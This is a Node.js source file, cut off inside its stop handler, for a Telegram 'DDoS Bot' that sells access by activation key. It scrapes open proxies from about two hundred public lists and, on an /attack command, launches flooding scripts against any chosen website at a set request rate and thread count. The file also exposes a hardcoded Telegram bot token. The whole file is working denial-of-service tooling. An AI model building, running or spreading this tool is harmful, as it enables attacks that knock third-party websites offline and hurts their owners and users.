const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const crypto = require('crypto');

// ---------- CONFIGURATION ----------
const BOT_TOKEN = '8466880238:AAGGEFLQ9T3TGrgoY0RgDHBUW2jKG7k3nLs';
const OWNER_ID = 7780973203; // your Telegram user ID (owner)
const SCRIPT_DIR = __dirname;
const PROXY_DIR = __dirname;
const DEFAULT_PROXY_FILE = 'proxy.txt';
const ATTACK_ANIMATION_URL = 'https://a.top4top.io/m_3718ze7811.mp4';
const DATA_FILE = path.join(__dirname, 'bot_data.json');
// -----------------------------------

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const activeAttacks = new Map();
let nextAttackId = 1;

// ---------- PERSISTENT STORAGE ----------
let db = { users: {}, keys: {} };

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE);
      db = JSON.parse(raw);
    } else {
      db = { users: {}, keys: {} };
      saveData();
    }
  } catch (err) {
    console.error('Failed to load data:', err);
    db = { users: {}, keys: {} };
  }
}

function saveData() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2));
  } catch (err) {
    console.error('Failed to save data:', err);
  }
}

loadData();

// ---------- AUTHORIZATION ----------
function isAuthorized(userId) {
  const user = db.users[userId];
  if (!user) return false;
  if (user.expires < Date.now()) {
    // expired, remove user
    delete db.users[userId];
    saveData();
    return false;
  }
  return true;
}

// ---------- PROXY SCRAPER ----------
const raw_proxy_sites = [
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
  "https://raw.githubusercontent.com/zloi-user/hideip.me/main/connect.txt",
  "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/all.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/proxy.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
  "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
  "https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt",
  "https://raw.githubusercontent.com/yogendratamang48/ProxyList/master/proxies.txt",
  "https://raw.githubusercontent.com/yemixzy/proxy-list/master/proxies.txt",
  "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/unchecked.txt",
  "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/proxylist.txt",
  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
  "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks5.txt",
  "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/socks5.txt",
  "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt",
  "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/socks4.txt",
  "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/http.txt",
  "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/http.txt",
  "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/all.txt",
  "https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/all.txt",
  "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/https.txt",
  "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/http.txt",
  "https://raw.githubusercontent.com/Tsprnay/Proxy-lists/master/proxies/all.txt",
  "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
  "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks5_proxies.txt",
  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks4_proxies.txt",
  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/http_proxies.txt",
  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/proxies.txt",
  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/generated/socks5_proxies.txt",
  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/generated/socks4_proxies.txt",
  "https://raw.githubusercontent.com/sunny9577/proxy-scraper/main/generated/http_proxies.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
  "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/working.txt",
  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/ultrafast.txt",
  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/premium.txt",
  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/new.txt",
  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
  "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/fast.txt",
  "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt",
  "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt",
  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/socks5.txt",
  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/socks4.txt",
  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
  "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
  "https://raw.githubusercontent.com/rx443/proxy-list/main/online/https.txt",
  "https://raw.githubusercontent.com/rx443/proxy-list/main/online/http.txt",
  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks5.txt",
  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/socks4.txt",
  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/http.txt",
  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
  "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
  "https://raw.githubusercontent.com/prxchk/proxy-list/main/https.txt",
  "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
  "https://raw.githubusercontent.com/prxchk/proxy-list/main/all.txt",
  "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
  "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
  "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
  "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks5.txt",
  "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks4.txt",
  "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt",
  "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/https.txt",
  "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
  "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
  "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
  "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/xResults/RAW.txt",
  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/xResults/old-data/Proxies.txt",
  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
  "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
  "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks5.txt",
  "https://raw.githubusercontent.com/ObcbO/getproxy/master/socks4.txt",
  "https://raw.githubusercontent.com/ObcbO/getproxy/master/https.txt",
  "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
  "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks5.txt",
  "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks4.txt",
  "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/https.txt",
  "https://raw.githubusercontent.com/ObcbO/getproxy/master/file/http.txt",
  "https://raw.githubusercontent.com/mython-dev/free-proxy-4000/main/proxy-4000.txt",
  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/https.txt",
  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
  "https://raw.githubusercontent.com/MrMarble/proxy-list/main/all.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/miyukii-chan/proxy-list/master/proxies/http.txt",
  "https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt",
  "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
  "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
  "https://raw.githubusercontent.com/mallisc5/master/proxy-list-raw.txt",
  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
  "https://raw.githubusercontent.com/j0rd1s3rr4n0/api/main/proxy/http.txt",
  "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/socks5.txt",
  "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/socks4.txt",
  "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/https.txt",
  "https://raw.githubusercontent.com/ItzRazvyy/ProxyList/main/http.txt",
  "https://raw.githubusercontent.com/im-razvan/proxy_list/main/socks5",
  "https://raw.githubusercontent.com/im-razvan/proxy_list/main/http.txt",
  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt",
  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
  "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
  "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
  "https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list",
  "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/socks4.txt",
  "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/http.txt",
  "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
  "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
  "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/socks5.txt",
  "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/socks4.txt",
  "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/https.txt",
  "https://raw.githubusercontent.com/enseitankado/proxine/main/proxy/http.txt",
  "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
  "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks4/global/socks4_checked.txt",
  "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/mix_checked.txt",
  "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global/http_checked.txt",
  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/https.txt",
  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/http.txt",
  "https://raw.githubusercontent.com/dunno10-a/proxy/main/proxies/all.txt",
  "https://raw.githubusercontent.com/Daesrock/XenProxy/main/socks5.txt",
  "https://raw.githubusercontent.com/Daesrock/XenProxy/main/socks4.txt",
  "https://raw.githubusercontent.com/Daesrock/XenProxy/main/proxylist.txt",
  "https://raw.githubusercontent.com/Daesrock/XenProxy/main/https.txt",
  "https://raw.githubusercontent.com/crackmag/proxylist/proxy/proxy.list",
  "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
  "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
  "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5",
  "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks4",
  "https://raw.githubusercontent.com/casals-ar/proxy-list/main/https",
  "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http",
  "https://raw.githubusercontent.com/caliphdev/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/caliphdev/Proxy-List/main/socks5.txt",
  "https://raw.githubusercontent.com/caliphdev/Proxy-List/main/http.txt",
  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/https.txt",
  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/http.txt",
  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/all.txt",
  "https://raw.githubusercontent.com/BlackCage/Proxy-Scraper-and-Verifier/main/Proxies/Not_Processed/proxies.txt",
  "https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt",
  "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
  "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
  "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt",
  "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt",
  "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt",
  "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
  "https://raw.githubusercontent.com/andigwandi/free-proxy/main/proxy_list.txt",
  "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
  "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
  "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
  "https://raw.githubusercontent.com/a2u/free-proxy-list/master/free-proxy-list.txt",
  "https://proxyspace.pro/socks5.txt",
  "https://proxyspace.pro/socks4.txt",
  "https://proxyspace.pro/https.txt",
  "https://proxyspace.pro/http.txt",
  "https://proxy-spider.com/api/proxies.example.txt",
  "https://openproxylist.xyz/socks5.txt",
  "https://openproxylist.xyz/socks4.txt",
  "https://openproxylist.xyz/https.txt",
  "https://openproxylist.xyz/http.txt",
  "https://naawy.com/api/public/proxylist/getList/?proxyType=socks5&format=txt",
  "https://naawy.com/api/public/proxylist/getList/?proxyType=socks4&format=txt",
  "https://naawy.com/api/public/proxylist/getList/?proxyType=https&format=txt",
  "https://naawy.com/api/public/proxylist/getList/?proxyType=http&format=txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous",
  "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
  "https://api.proxyscrape.com/v2/?request=displayproxies",
  "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
  "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
  "https://api.openproxylist.xyz/socks5.txt",
  "https://api.openproxylist.xyz/socks4.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.good-proxies.ru/getfree.php?count=1000&key=freeproxy",
];

async function scrapeProxies(progressCallback) {
  const proxies = new Set();
  const total = raw_proxy_sites.length;
  let processed = 0;

  for (const site of raw_proxy_sites) {
    try {
      const response = await axios.get(site, { timeout: 10000 });
      if (response.status === 200) {
        const lines = response.data.split('\n');
        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed.includes(':')) {
            const [ip, port] = trimmed.split(':', 2);
            if (ip.split('.').length === 4 && !isNaN(parseInt(port))) {
              proxies.add(`${ip}:${port}`);
            }
          }
        }
      }
    } catch {
      // ignore failed sources
    }
    processed++;
    if (progressCallback) {
      progressCallback(processed, total, proxies.size);
    }
  }

  const proxyList = Array.from(proxies);
  const outputPath = path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
  fs.writeFileSync(outputPath, proxyList.join('\n'));
  return proxyList.length;
}

// ---------- Helper functions ----------
function validateAttackParams(method, target, time, rps, threads, proxyFile) {
  if (!['zaher', 'zaherH2', 'cfzaher'].includes(method)) {
    return `❌ *Invalid method: ${method}*\nUse: zaher, zaherH2, or cfzaher`;
  }
  const urlPattern = /^https?:\/\/.+/i;
  if (!urlPattern.test(target)) {
    return `❌ *Invalid URL: ${target}*\nMust start with http:// or https://`;
  }
  if (!/^\d+$/.test(time) || parseInt(time) <= 0) {
    return `❌ *Invalid time: ${time}*\nTime must be a positive number (seconds)`;
  }
  if (!/^\d+$/.test(rps) || parseInt(rps) <= 0) {
    return `❌ *Invalid RPS: ${rps}*\nRPS must be a positive number`;
  }
  if (!/^\d+$/.test(threads) || parseInt(threads) <= 0) {
    return `❌ *Invalid threads: ${threads}*\nThreads must be a positive number`;
  }

  if (proxyFile) {
    const proxyPath = path.join(PROXY_DIR, proxyFile);
    if (!fs.existsSync(proxyPath)) {
      return `❌ *Proxy file not found: ${proxyFile}*\nUse /scrape to generate proxies or provide a valid file`;
    }
  } else {
    const defaultPath = path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
    if (!fs.existsSync(defaultPath)) {
      return `❌ *No proxies available*\nRun /scrape first to download proxy list`;
    }
  }
  return null;
}

function getScriptPath(method) {
  const scriptMap = {
    zaher: 'zaher.js',
    zaherH2: 'zaherH2.js',
    cfzaher: 'cfzaher.js'
  };
  return path.join(SCRIPT_DIR, scriptMap[method]);
}

// ---------- Authorization helper ----------
function ensureAuthorized(msg, callback) {
  const userId = msg.from.id;
  if (!isAuthorized(userId)) {
    bot.sendMessage(msg.chat.id,
      '🔑 *Access Denied*\nYou need a valid key to use this bot.\nUse /activate <key> to activate.',
      { parse_mode: 'Markdown' }
    );
    return false;
  }
  return true;
}

// ---------- COMMAND HANDLERS ----------

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  if (!ensureAuthorized(msg)) return;

  bot.sendAnimation(chatId, ATTACK_ANIMATION_URL, {
    caption: 
    `👋 *Welcome to DDoS Bot*\n\n` +
    `📝 *Quick Commands:*\n` +
    `/attack - Launch an attack\n` +
    `/list - Show active attacks\n` +
    `/stop <id> - Stop an attack\n` +
    `/stopall - Stop all active attacks\n` +
    `/scrape - Update proxy list\n\n` +
    `ℹ️ *More Info:*\n` +
    `/help - Full usage guide\n` +
    `/methods - Available attack methods`,
    parse_mode: 'Markdown'
  });
});

bot.onText(/\/help/, (msg) => {
  if (!ensureAuthorized(msg)) return;
  const chatId = msg.chat.id;

  bot.sendAnimation(chatId, ATTACK_ANIMATION_URL, {
    caption: `📖 *Complete Usage Guide*\n\n` +
    `*1. ATTACK COMMAND*\n` +
    `\`/attack <method> <url> <time> <rps> <threads> [proxyfile]\`\n\n` +
    `📌 *Parameters:*\n` +
    `  • method: zaher, zaherH2, or cfzaher\n` +
    `  • url: Target URL (https://example.com)\n` +
    `  • time: Duration in seconds\n` +
    `  • rps: Requests per second\n` +
    `  • threads: Number of threads\n` +
    `  • proxyfile: Optional proxy file (default: ${DEFAULT_PROXY_FILE})\n\n` +
    `✅ *Example:*\n` +
    `\`/attack zaher https://example.com 60 500 10\`\n\n` +
    `*2. MANAGE ATTACKS*\n` +
    `\`/list\` - View all active attacks\n` +
    `\`/stop <id>\` - Stop a specific attack\n` +
    `\`/stopall\` - Stop all active attacks\n\n` +
    `*3. PROXIES*\n` +
    `\`/scrape\` - Fetch and update proxies\n\n` +
    `*4. INFO*\n` +
    `\`/methods\` - Show available methods`,
    parse_mode: 'Markdown'
  });
});

bot.onText(/\/methods/, (msg) => {
  if (!ensureAuthorized(msg)) return;
  bot.sendMessage(msg.chat.id,
    `📋 *Available attack methods:*\n` +
    `- \`zaher\`\n` +
    `- \`zaherH2\`\n` +
    `- \`cfzaher\``,
    { parse_mode: 'Markdown' }
  );
});

bot.onText(/\/scrape/, async (msg) => {
  if (!ensureAuthorized(msg)) return;
  const chatId = msg.chat.id;

  const statusMsg = await bot.sendMessage(chatId, '🔄 Starting proxy scraper...');

  let lastUpdate = Date.now();
  const progressCallback = async (processed, total, found) => {
    if (Date.now() - lastUpdate > 3000) {
      await bot.editMessageText(
        `🔄 Scraping progress: ${processed}/${total} sources processed\n📦 Proxies found so far: ${found}`,
        { chat_id: chatId, message_id: statusMsg.message_id }
      ).catch(() => { });
      lastUpdate = Date.now();
    }
  };

  try {
    const count = await scrapeProxies(progressCallback);
    await bot.editMessageText(
      `✅ Scraping complete!\n📦 Total unique proxies: ${count}\nSaved to \`${DEFAULT_PROXY_FILE}\``,
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
    );
  } catch (err) {
    await bot.editMessageText(
      `❌ Scraping failed: ${err.message}`,
      { chat_id: chatId, message_id: statusMsg.message_id }
    );
  }
});

bot.onText(/\/attack/, (msg) => {
  if (!ensureAuthorized(msg)) return;
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const args = msg.text.split(' ').slice(1);
  if (args.length < 5) {
    return bot.sendMessage(
      chatId,
      `❌ *Invalid attack command*\n\n` +
      `*Format:*\n\`/attack <method> <url> <time> <rps> <threads> [proxyfile]\`\n\n` +
      `*Example:*\n\`/attack zaher https://example.com 60 500 10\`\n\n` +
      `Use /help for more details`,
      { parse_mode: 'Markdown' }
    );
  }

  let [method, target, time, rps, threads, proxyFile] = args;
  if (args.length === 5) proxyFile = null;

  const error = validateAttackParams(method, target, time, rps, threads, proxyFile);
  if (error) return bot.sendMessage(chatId, error, { parse_mode: 'Markdown' });

  const proxyPath = proxyFile
    ? path.join(PROXY_DIR, proxyFile)
    : path.join(PROXY_DIR, DEFAULT_PROXY_FILE);

  const scriptPath = getScriptPath(method);
  const scriptArgs = [target, time, rps, threads, proxyPath];

  const child = spawn('node', [scriptPath, ...scriptArgs], {
    cwd: SCRIPT_DIR,
    stdio: ['ignore', 'pipe', 'pipe']
  });

  const attackId = nextAttackId++;
  const startTime = Date.now();

  activeAttacks.set(attackId, {
    pid: child.pid,
    method,
    target,
    time: parseInt(time),
    rps: parseInt(rps),
    threads: parseInt(threads),
    proxyFile: proxyFile || DEFAULT_PROXY_FILE,
    chatId,
    userId,
    startTime,
    child
  });

  const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
  const caption = `🚀 *Attack started*\n` +
    `ID: \`${attackId}\`\n` +
    `Method: ${method}\n` +
    `Target: ${target}\n` +
    `Time: ${time}s\n` +
    `RPS: ${rps}\n` +
    `Threads: ${threads}\n` +
    `Proxy: ${proxyFile || DEFAULT_PROXY_FILE}\n` +
    `Check Host: [Check-Host](${checkHostUrl})`;

  bot.sendAnimation(chatId, ATTACK_ANIMATION_URL, { caption, parse_mode: 'Markdown' })
    .then(sentMsg => {
      const attack = activeAttacks.get(attackId);
      if (attack) attack.messageId = sentMsg.message_id;
      console.log(`✅ Attack ${attackId} started by user ${userId}`);
    })
    .catch(() => {
      bot.sendMessage(chatId, caption, { parse_mode: 'Markdown' })
        .then(sentMsg => {
          const attack = activeAttacks.get(attackId);
          if (attack) attack.messageId = sentMsg.message_id;
        });
    });

  child.stdout.on('data', data => console.log(`[Attack ${attackId}] stdout: ${data}`));
  child.stderr.on('data', data => console.error(`[Attack ${attackId}] stderr: ${data}`));

  child.on('exit', (code, signal) => {
    const attack = activeAttacks.get(attackId);
    if (!attack) return;

    const duration = Math.round((Date.now() - attack.startTime) / 1000);
    const status = code === 0 ? '✅ Completed' : `❌ Crashed (code ${code}${signal ? ' signal ' + signal : ''})`;

    bot.editMessageText(
      `🚀 *Attack finished*\n` +
      `ID: \`${attackId}\`\n` +
      `Method: ${attack.method}\n` +
      `Target: ${attack.target}\n` +
      `Duration: ${duration}s\n` +
      `Status: ${status}`,
      {
        chat_id: attack.chatId,
        message_id: attack.messageId,
        parse_mode: 'Markdown'
      }
    ).catch(() => { });

    activeAttacks.delete(attackId);
  });

  setTimeout(() => {
    const attack = activeAttacks.get(attackId);
    if (attack) attack.child.kill();
  }, (parseInt(time) + 5) * 1000);
});

bot.onText(/\/list/, (msg) => {
  if (!ensureAuthorized(msg)) return;
  const chatId = msg.chat.id;

  if (activeAttacks.size === 0) {
    return bot.sendMessage(chatId, '📭 *No active attacks*\nStart one with /attack', { parse_mode: 'Markdown' });
  }

  let response = `📋 *Active Attacks (${activeAttacks.size})*\n\n`;
  for (const [id, attack] of activeAttacks.entries()) {
    const runningFor = Math.round((Date.now() - attack.startTime) / 1000);
    const timeLeft = Math.max(0, attack.time - runningFor);
    const progress = Math.round((runningFor / attack.time) * 100);
    response += `🆔 ID: \`${id}\`\n`;
    response += `🎯 Target: ${attack.target}\n`;
    response += `⚙️ Method: ${attack.method}\n`;
    response += `👤 Started by: \`${attack.userId}\`\n`;
    response += `⏱️ Progress: ${runningFor}/${attack.time}s (${progress}%)\n`;
    response += `⏳ Time left: ${timeLeft}s\n\n`;
  }
  bot.sendAnimation(chatId, ATTACK_ANIMATION_URL, { caption: response, parse_mode: 'Markdown' });
});

// ---------- FIXED STOP COMMAND ----------
bot.onText(/^\/stop(?:\s+(\d+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

